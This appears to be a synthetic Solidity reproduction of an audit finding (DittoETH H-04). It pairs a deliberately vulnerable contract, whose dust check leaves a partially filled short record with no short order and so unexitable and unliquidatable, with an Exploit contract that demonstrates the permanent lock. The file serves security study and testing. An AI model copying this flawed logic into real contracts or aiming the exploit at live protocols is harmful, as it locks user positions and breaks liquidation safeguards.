// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////
    DittoETH — [H-04] Partially filled Short Records created
    without a short order cannot be liquidated and exited
    (Code4rena 2024-03-dittoeth, 0xbepresent, finding #34174)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: LibOrders.sellMatchAlgo() sets a Short Record's status
    to PartiallyFilled as soon as it matches only part of the incoming
    short against the order book, THEN separately decides whether to
    keep the unmatched remainder on the market as a sell (short) order.
    That decision is gated by a dust check:

        matchIncomingSell(asset, incomingAsk, matchTotal);
        if (incomingAsk.ercAmount.mul(incomingAsk.price) >= minAskEth) {
            addSellOrder(incomingAsk, asset, orderHintArray);
        }

    If the leftover value is BELOW minAskEth, no sell order is created —
    yet the Short Record is already marked PartiallyFilled. Every exit
    and liquidation path (ExitShortFacet, PrimaryLiquidationFacet,
    SecondaryLiquidationFacet) requires a shortOrderId whose linked
    order.shortRecordId/addr match the Short Record (LibSRUtil's
    checkCancelShortOrder). With no such order, ALL of these calls
    permanently revert with InvalidShortOrder() — the position can
    never be exited or liquidated (a permanent DoS/lock).

    This reduction keeps the blamed if-check (@> VULN) verbatim inside
    a minimal single-bid matching loop, and reproduces the exact
    ownership check from LibSRUtil.sol#L57 that every exit/liquidation
    path relies on. //////////////////////////////////////////////// */

/// @dev Fixed-point helper mirroring DittoETH's PRBMathHelper.mul (18-decimal WAD math):
///      ercAmount.mul(price) == ercAmount * price / 1e18 in the real protocol.
library Mul {
    function mul(uint88 x, uint80 y) internal pure returns (uint256 result) {
        result = (uint256(x) * uint256(y)) / 1e18;
    }
}

contract Vulnerable {
    using Mul for uint88;

    enum SR {
        Closed,
        Cancelled,
        PartialFill,
        FullyFilled
    }

    struct ShortRecord {
        uint88 ercDebt;
        uint88 collateral;
        SR status;
    }

    struct Order {
        address addr;
        uint8 shortRecordId;
        uint16 id;
        uint88 ercAmount;
        uint80 price;
        bool exists;
    }

    // Dust threshold below which a leftover ask/short is not worth keeping on the
    // book (mirrors LibAsset.minAskEth — a per-asset minimum notional ask value).
    uint256 public constant MIN_ASK_ETH = 1 ether;

    // A single simplified resting bid (real DittoETH walks a full linked-list order
    // book; one bid is sufficient to trigger the exact dust branch below).
    struct Bid {
        uint88 ercAmount;
        uint80 price;
        bool active;
    }

    Bid public bid;
    uint16 public nextOrderId = 1;

    mapping(address => mapping(uint8 => ShortRecord)) public shortRecords;
    mapping(uint16 => Order) public shorts; // short (ask-side) orders resting on the market

    error InvalidShortOrder();

    function placeBid(uint88 ercAmount, uint80 price) external {
        bid = Bid(ercAmount, price, true);
    }

    /// @notice Reduced createLimitShort + LibOrders.sellMatchAlgo(). Matches an
    /// incoming short against the single resting bid, updates the Short Record's
    /// fill status, and then decides (via the VULNERABLE dust check) whether to
    /// keep the unmatched remainder on the market as a short (sell) order.
    function createLimitShort(uint8 shortId, uint88 ercAmount, uint80 price)
        external
        returns (uint16 shortOrderId)
    {
        ShortRecord storage sr = shortRecords[msg.sender][shortId];
        require(sr.status == SR.Closed || sr.status == SR.Cancelled, "SR already exists");

        uint88 incomingAskErcAmount = ercAmount; // "incomingAsk.ercAmount" in the original code

        uint88 matched;
        if (bid.active && price <= bid.price) {
            matched = incomingAskErcAmount > bid.ercAmount ? bid.ercAmount : incomingAskErcAmount;
            incomingAskErcAmount -= matched;
            bid.active = false; // resting bid fully consumed
        }

        // Debt/collateral accrued from the matched portion (1:1 collateralization,
        // simplified from the real vault-based accounting).
        sr.ercDebt += matched;
        sr.collateral += matched;

        if (incomingAskErcAmount == 0) {
            sr.status = SR.FullyFilled;
            return 0;
        }

        // ── Short Record is marked PartiallyFilled BEFORE the market-listing
        //    decision below is made — this ordering is the root of the bug. ──
        sr.status = SR.PartialFill;

        // ============ VULNERABLE SNIPPET (verbatim logic from LibOrders.sol
        // sellMatchAlgo(), lines 591-597 of the audited commit) ============
        //
        //     matchIncomingSell(asset, incomingAsk, matchTotal);
        //     if (incomingAsk.ercAmount.mul(incomingAsk.price) >= minAskEth) {
        //         addSellOrder(incomingAsk, asset, orderHintArray);
        //     }
        //
        // matchIncomingSell() only emits settlement bookkeeping (elided here — it
        // has no bearing on the bug); addSellOrder() is what actually attaches a
        // short order to the Short Record.
        if (incomingAskErcAmount.mul(price) >= MIN_ASK_ETH) {
            shortOrderId = nextOrderId++;
            shorts[shortOrderId] = Order(msg.sender, shortId, shortOrderId, incomingAskErcAmount, price, true);
        }
        // @> VULN: when the leftover value is below MIN_ASK_ETH, NO short order is
        //          created — but `sr.status` was already set to PartialFill above.
        //          The Short Record now exists with no linked short order at all.
        // FIX: zero `incomingAsk.ercAmount` before calling matchIncomingSell (as
        //      DittoETH's own recommended mitigation does), so the remainder is
        //      folded into the match and the SR is marked FullyFilled instead of
        //      being left dangling with a sub-dust, order-less remainder.
        // ======================================================================
    }

    /// @notice Reduced ExitShortFacet.exitShort(). Mirrors the exact ownership
    /// check every exit/liquidation path performs via LibSRUtil.checkCancelShortOrder
    /// (LibSRUtil.sol#L57): the short order attached to `shortOrderId` must belong to
    /// this exact Short Record and be owned by the caller, or the call reverts.
    function exitShort(uint8 shortId, uint16 shortOrderId) external {
        Order storage shortOrder = shorts[shortOrderId];
        // ============ VERBATIM CHECK (LibSRUtil.sol#L57) ============
        if (shortOrder.shortRecordId != shortId || shortOrder.addr != msg.sender) {
            revert InvalidShortOrder();
        }
        // ==============================================================
        shortRecords[msg.sender][shortId].status = SR.Closed;
    }

    /// @notice Reduced PrimaryLiquidationFacet.liquidate() ownership gate — same
    /// checkCancelShortOrder() check, reached by a liquidator instead of the shorter.
    function liquidate(address shorter, uint8 shortId, uint16 shortOrderId) external {
        Order storage shortOrder = shorts[shortOrderId];
        if (shortOrder.shortRecordId != shortId || shortOrder.addr != shorter) {
            revert InvalidShortOrder();
        }
        shortRecords[shorter][shortId].status = SR.Closed;
    }
}

contract Exploit {
    Vulnerable public v; // CREATE nonce 1

    function run() external {
        v = new Vulnerable();

        // A resting bid that is smaller than the incoming short, chosen so the
        // leftover (1 ether ercAmount at 0.5 price = 0.5 ether notional) falls
        // BELOW the 1 ether MIN_ASK_ETH dust threshold.
        v.placeBid(4 ether, 0.5 ether);

        // Sender opens a 5 ether short at the same price: 4 ether matches the bid,
        // leaving exactly 1 ether unmatched -> 1 ether * 0.5 ether / 1e18 = 0.5 ether
        // notional, which is < MIN_ASK_ETH -> the VULN branch is taken.
        uint16 shortOrderId = v.createLimitShort(1, 5 ether, 0.5 ether);

        // Harm, step 1: the Short Record is left PartiallyFilled with no short
        // order attached at all (id 0 is never a valid order).
        (,, Vulnerable.SR status) = v.shortRecords(address(this), 1);
        require(status == Vulnerable.SR.PartialFill, "expected PartialFill status");
        require(shortOrderId == 0, "expected no short order to be created");

        // Harm, step 2: the position can NEVER be exited. Every valid shortOrderId
        // choice fails the ownership check because no order exists for this SR —
        // this is the permanent DoS/lock the finding describes.
        bool exitReverted;
        try v.exitShort(1, 0) {
            // not reached
        } catch (bytes memory reason) {
            exitReverted = bytes4(reason) == Vulnerable.InvalidShortOrder.selector;
        }
        require(exitReverted, "harm not demonstrated: exit should have permanently reverted");

        // Harm, step 3: liquidation is equally impossible — same ownership gate,
        // same InvalidShortOrder() revert, so an underwater position can never be
        // liquidated either.
        bool liquidateReverted;
        try v.liquidate(address(this), 1, 0) {
            // not reached
        } catch (bytes memory reason) {
            liquidateReverted = bytes4(reason) == Vulnerable.InvalidShortOrder.selector;
        }
        require(liquidateReverted, "harm not demonstrated: liquidation should have permanently reverted");
    }
}
